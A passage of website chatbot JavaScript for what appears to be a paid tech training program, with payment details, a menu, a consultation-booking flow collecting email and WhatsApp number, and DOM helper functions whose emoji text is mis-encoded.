â€¢ IBAN: PK66UNIL0109000285863354

**Mobile Wallet:**
â€¢ EasyPaisa/JazzCash: 03104212713

Send screenshot via WhatsApp after payment.`);
        
        showButtons(["ğŸ“ Registration", "ğŸ“… Book Consultation", "ğŸ˜„ Tell Me a Joke", "â¬…ï¸ Menu"]);
    }

    function showHelp() {
        addBot(`I can help you with:

ğŸ“‹ **Program** - What's included
ğŸ’° **Fees** - Pricing info
ğŸ“š **Curriculum** - Skills taught
ğŸ’¼ **Career** - Job opportunities
ğŸ“… **Booking** - Schedule consultation
ğŸ˜„ **Jokes** - Tech humor!

Just ask or tap a button below.`);
        showMainMenu();
    }

    // ==================== BOOKING FLOW ====================
    
    function startBooking() {
        if (state.booked) {
            addBot(`You've already booked for ${state.date} at ${state.time}! ğŸ‰

Need to reschedule? Contact us on WhatsApp.`);
            showMainMenu();
            return;
        }

        state.step = 'email';
        addBot("Great! Let's book your free consultation. ğŸ“…\n\nWhat's your email address?");
        clearButtons();
    }

    function handleEmail(email) {
        if (!isValidEmail(email)) {
            addBot("Please enter a valid email (e.g., name@gmail.com)");
            return;
        }
        state.email = email;
        state.step = 'phone';
        addBot("Got it! Now your WhatsApp number with country code (e.g., +923001234567):");
    }

    function handlePhone(phone) {
        if (!isValidPhone(phone)) {
            addBot("Please enter a valid phone number (10-15 digits)");
            return;
        }
        state.phone = phone;
        state.step = 'date';
        addBot("Select your preferred date:");
        showButtons(generateDates(5));
    }

    function handleDate(date) {
        state.date = date;
        state.step = 'time';
        addBot(`${date} - great choice! Select a time:`);
        showButtons(["9:00 AM", "11:00 AM", "2:00 PM", "4:00 PM", "6:00 PM"]);
    }

    function handleTime(time) {
        state.time = time;
        state.step = 'confirm';
        addBot(`<strong>ğŸ“‹ Booking Summary</strong>

ğŸ“§ Email: ${state.email}
ğŸ“± WhatsApp: ${state.phone}
ğŸ“… Date: ${state.date}
â° Time: ${state.time}

Confirm this booking?`);
        showButtons(["âœ… Confirm", "âŒ Cancel"]);
    }

    function handleConfirm(msg) {
        const m = msg.toLowerCase();
        
        if (m.includes('confirm') || m.includes('yes')) {
            state.booked = true;
            state.step = 'menu';
            
            addBot(`ğŸ‰ **Booking Confirmed!**

ğŸ“… ${state.date} at ${state.time}

You'll receive a WhatsApp confirmation shortly.

See you soon! ğŸš€`);
            
            setTimeout(() => {
                addBot("Anything else I can help with? Or want to hear a joke while you wait? ğŸ˜„");
                showMainMenu();
            }, 2000);
        } else {
            state.step = 'menu';
            addBot("No problem! Booking cancelled. Let me know when you're ready.");
            showMainMenu();
        }
    }

    // ==================== UI FUNCTIONS ====================
    
    function showMainMenu() {
        state.step = 'menu';
        showButtons([
            "ğŸ“‹ Program Details",
            "ğŸ’° Fees & Pricing",
            "ğŸ“š Curriculum",
            "ğŸ’¼ Career Options",
            "ğŸ“ Registration",
            "ğŸ’³ Payment Methods",
            "ğŸ“… Book Consultation",
            "ğŸ˜„ Tell Me a Joke"
        ]);
    }

    function addUser(msg) {
        const div = document.createElement('div');
        div.className = 'message user-message';
        div.textContent = msg;
        chatbotMessages.appendChild(div);
        scrollToBottom();
        state.history.push({ role: 'user', content: msg });
    }

    function addBot(msg) {
        const div = document.createElement('div');
        div.className = 'message bot-message';
        div.innerHTML = msg;
        chatbotMessages.appendChild(div);
        scrollToBottom();
        state.history.push({ role: 'bot', content: msg });
    }

    function showTyping() {
        const div = document.createElement('div');
        div.className = 'typing-indicator';
        div.id = 'typing';
        div.innerHTML = '<span></span><span></span><span></span>';
        chatbotMessages.appendChild(div);
        scrollToBottom();
    }

    function removeTyping() {
        const el = document.getElementById('typing');
        if (el) el.remove();
    }

    function showButtons(options) {
        suggestedButtons.innerHTML = '';
        options.forEach(opt => {
            const btn = document.createElement('button');
            btn.className = 'suggested-btn';
            btn.textContent = opt;
            btn.onclick = () => {
                userInput.value = opt;
                handleInput();
            };
            suggestedButtons.appendChild(btn);
        });
    }

    function clearButtons() {
        suggestedButtons.innerHTML = '';
    }

    function scrollToBottom() {
        chatbotMessages.scrollTop = chatbotMessages.scrollHeight;
    }
});


// ChatBot Ended

